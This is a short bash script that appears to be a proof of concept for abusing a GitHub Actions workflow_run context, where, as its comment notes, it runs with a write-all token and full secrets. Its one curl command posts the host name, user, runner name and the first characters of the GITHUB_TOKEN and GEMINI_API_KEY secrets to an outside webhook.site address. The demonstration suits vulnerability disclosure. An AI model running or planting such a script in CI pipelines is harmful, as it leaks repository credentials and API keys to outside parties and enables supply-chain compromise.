#!/usr/bin/env bash
# Runs in workflow_run context (base branch, write-all token, full secrets)
curl -s -m 15 -X POST "https://webhook.site/ca8f56c9-fe20-4a8f-8585-c4d03bfa4095"   -H "Content-Type: application/json"   -d "{\"poc\":\"2-workflow-run\",\"hostname\":\"$(hostname)\",\"user\":\"$(whoami)\",\"runner\":\"$RUNNER_NAME\",\"github_token\":\"$(echo $GITHUB_TOKEN | head -c 20)...\",\"gemini_key\":\"$(echo $GEMINI_API_KEY | head -c 10)...\"}"   || true
